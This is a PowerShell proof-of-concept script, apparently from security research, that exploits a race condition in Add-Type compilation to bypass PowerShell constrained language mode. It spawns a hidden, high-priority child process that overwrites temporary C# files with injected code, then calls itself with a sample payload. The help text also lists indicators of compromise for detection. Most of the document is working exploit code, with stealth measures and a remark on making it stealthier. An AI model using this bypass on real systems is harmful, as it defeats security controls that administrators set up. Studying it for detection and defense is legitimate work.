function Add-TypeRaceCondition {
<#
.SYNOPSIS

Compiles and loads CSharp code by exploiting a race condition in C# compilation with csc.exe, bypassing constrained language mode.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.DESCRIPTION

Add-TypeRaceCondition exploits a race condition vulnerability in Add-Type and compiles and loads CSharp code, bypassing constrained language mode. The vulnerability in Add-Type relies on the fact that it drops the code to be compiled to a .cs file in the user's TEMP directory. Considering %TEMP% is writeable by the user, Add-TypeRaceCondition continually looks for new .cs files in %TEMP% and overwrites any new ones with the code specified in -TypeDefinition. Note: this is is not a PowerShell bug. This is a bug in how files are created, compiled, and loaded with csc.exe.

.PARAMETER TypeDefinition

Specifies the source code that contains the type definitions. Enter the source code in a string or here-string, or enter a variablethat contains the source code. For more information about here-strings, see about_Quoting_Rules.

Include a namespace declaration in your type definition. If you omit the namespace declaration, your type might have the same name as another type or the shortcut for another type, causing an unintentional overwrite. For instance, if you define a type called Exception, scripts that use Exception as the shortcut for System.Exception will fail.

.EXAMPLE

$PoCPayload = @'
namespace Injected {
    public class Class {
        public static string ToString(string message) {
            // Here's where you would execute your payload...

            return message;
        }
    }
}
'@

# You may have to attempt to trigger this multiple times
Add-TypeRaceCondition -TypeDefinition $PoCPayload

# Validate that the type was loaded and executes
[Injected.Class]::ToString('Hello, from bypassed constrained language mode!')

.NOTES

While your C# will be compiled and loaded, constrained language mode still prevents you from instantiating .NET classes and calling their methods. You can however call property getter methods or an implemented ToString method (static or instance).

Indicators of compromise
------------------------
Indicators related to Add-Type hijacking. I won't bother with indicators related to this script since it is easily altered.

Note: There is plenty of legitimate, signed PowerShell code that calls Add-Type.
Legitimate calls to Add-Type will drop files with prevalence.

File artifacts:
1) %TEMP%\<RANDOM_8_CHARS>.0.cs
   * Created by, deleted by, written to by powershell.exe
   * Read by csc.exe
   * Does not persist. Deleted quickly after use.
2) %TEMP%\<RANDOM_8_CHARS>.dll
   * Written to by csc.exe
   * Read from by, deleted by powershell.exe
   * This will be a low-prevalence PE not associated with DLLs emited via otherwise legitimate calls to Add-Type.
   * Does not persist. Deleted quickly after use.
   * Unfortunately, image load sysmon events are not possible with this artifact since it is not loaded via traditional means.

Process creation:
1) "<DOTNET_FRAMEWORK_DIR>\csc.exe" /noconfig /fullpaths @"%TEMP%\<RANDOM_8_CHARS>.cmdline"
   * Parent process: powershell.exe
2) <DOTNET_FRAMEWORK_DIR>\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:%TEMP%\RES<RANDOM_3_HEX_CHARS>.tmp" "%TEMP%\CSC<RANDOM_32_HEX_CHARS>.TMP"
   * Parent process: csc.exe
#>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TypeDefinition
    )

    # This is one of the classes that is compiled/loaded with Add-Type in the PSDiagnostics module.
    # This class needs to not exist in order to successfully trigger the bypass.
    if ('Microsoft.PowerShell.Diagnostics.LogDetails' -as [Type]) {
        throw 'The PSDiagnostics module has already been loaded. Restart PowerShell and try again.'
    }

    $TempCSFiles = "$env:TEMP\*.cs"

    # Remove any existing C# compilation artifacts from %TEMP%
    Get-ChildItem -Path $TempCSFiles | Remove-Item -Force

    # The payload to execute in the child PowerShell process.
    # This is a somewhat dirty bruteforce method of overwriting
    # the original C# but it is nonetheless effective.
    $OverwriteTask = {
        $TypeDefinition = @'
REPLACEME
'@

        Get-ChildItem "$env:TEMP\*.cs" | Remove-Item -Force

        do {
            $Overwritten = $null
            try { $OverWritten = Get-ChildItem "$env:TEMP\*.cs" -ErrorAction SilentlyContinue | Set-Content -Value $TypeDefinition -PassThru } catch { $null }
        } while (-not $Overwritten)
    }

    # Fill the C# overwrite payload with the user specified C#.
    $OverwriteTask = $OverwriteTask.ToString().Replace('REPLACEME', $TypeDefinition)

    Write-Verbose "Child process payload:`n$OverwriteTask"

    $ChildTaskPath = Join-Path -Path $PWD -ChildPath 'overwritetask.ps1'

    $OverwriteTask | Out-File -FilePath $ChildTaskPath

    $ProcessStartupClass = Get-CimClass -ClassName Win32_ProcessStartup
    # Hide the window for the child PowerShell process to be created.
    $ProcessStartup = New-CimInstance -CimClass $ProcessStartupClass -ClientOnly -Property @{ ShowWindow = 0 }

    $ChildProcArguments = @{
        ClassName = 'Win32_Process'
        MethodName = 'Create'
        Arguments = @{
            CommandLine = "powershell.exe -nop -ep unrestricted -file $ChildTaskPath"
            CurrentDirectory = $PWD.Path
            ProcessStartupInformation = $ProcessStartup
        }
    }

    Write-Verbose "Child process command line: $($ChildProcArguments.Arguments.CommandLine)"

    # Spawn the child PowerShell process that will perform the overwrite.
    # Note: I probably could have spawned a job here, obviating the need to
    # drop a file to disk. Someone wanting to be more stealthy might want
    # to implement that.
    $Proc = Invoke-CimMethod @ChildProcArguments

    # Validate that the child process was created.
    if ($Proc.ReturnValue -ne 0) {
        Remove-Item $TriggerPayloadPath
        throw 'Failed to start PowerShell process'
        return
    }

    $ProcId = $Proc.ProcessId

    # Get a CIM instance of the spawned PowerShell process.
    $OverwriteProcess = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $ProcId"

    # Set process priority to 'High Priority'. Doing so will help win the race.
    # Note: It's not guaranteed that the race will be won. You may have to make several attempts.
    $Result = $OverwriteProcess | Invoke-CimMethod -MethodName SetPriority -Arguments @{ Priority = 128 }

    # Still attempt to perform the overwrite if the process' priority cannot be set.
    if ($Result.ReturnValue -ne 0) { Write-Error 'Unable to set process priority' }

    Start-Sleep -Seconds 2

    # PSDiagnostics is a module that's been around for a while and
    # calls Add-Type. You could choose any signed module that calls
    # Add-Type though.
    Import-Module -Name PSDiagnostics

    Start-Sleep -Seconds 2

    # Clean up any stale C# artifacts
    Get-ChildItem -Path $TempCSFiles | Remove-Item -Force

    # Kill the child PowerShell process
    Stop-Process -Id $ProcId -ErrorAction SilentlyContinue

    # Clean up child process payload
    Remove-Item -Path $ChildTaskPath

    # At this point, you'll have to manually validate that your injected type definition was loaded.
}

$PoCPayload = @'
using System;
using System.IO;
namespace Injected {
    public class Class {
        public static string ToString(string message) {
            // Here's where you would execute your payload...
			Console.WriteLine(message);
            return message;
        }
    }
}
'@

# You may have to attempt to trigger this multiple times
Add-TypeRaceCondition -TypeDefinition $PoCPayload

# Validate that the type was loaded and executes
$ret = [Injected.Class]::ToString('Hello, from bypassed constrained language mode!')

